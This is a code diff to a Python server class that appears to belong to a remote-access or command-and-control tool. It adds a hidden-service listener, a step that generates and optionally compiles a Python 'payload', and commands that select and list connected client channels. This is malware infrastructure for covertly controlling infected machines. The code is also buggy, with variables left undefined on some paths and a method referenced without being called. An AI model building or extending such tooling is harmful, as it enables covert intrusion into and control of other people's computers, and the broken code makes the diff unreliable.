@@ -4,17 +4,25 @@ import _thread
 import os
 import subprocess
 import Lib.Generator
+from Listners.HiddenService import HiddenService
 
 
 class Server:
 
-    def __init__(self,port,payload):
+    def __init__(self,port,payload,hiddenservice="new"):
+        if hiddenservice == "new":
+            h = HiddenService(port,payload)
         self.sock = socket.socket()
         self.payload = payload
-        self.addr = GetHostName(payload)
+        self.addr = h.GetHostName()
         self.port = port
         self.clients = {}
-        self.generated = Generator.Generator(self.payload,self.port,self.addr)
+        data = input("[!] do you want to compile the python payload(y:n) ")
+        if data == "y":
+            opts = {"compile" : True}
+        if data == "n":
+            opts = {"compile" : False}
+        self.generated = Generator.Generator(self.payload,self.port,self.addr,opts)
 
 
     def run(self):
@@ -36,7 +44,10 @@ class Server:
                 inp = input(self.payload + ">")
                 if inp.startswith("set"):
                     self.currentChannel = int(inp.split(" ")[1])
-                    comunicate()
+                    self.comunicate()
+                if inp.startswith("list"):
+                    for channel , c in self.clients.items:
+                        print("[+] " + channel + "addr:" + c.addr)
                 if inp == "exit":
                     break
     
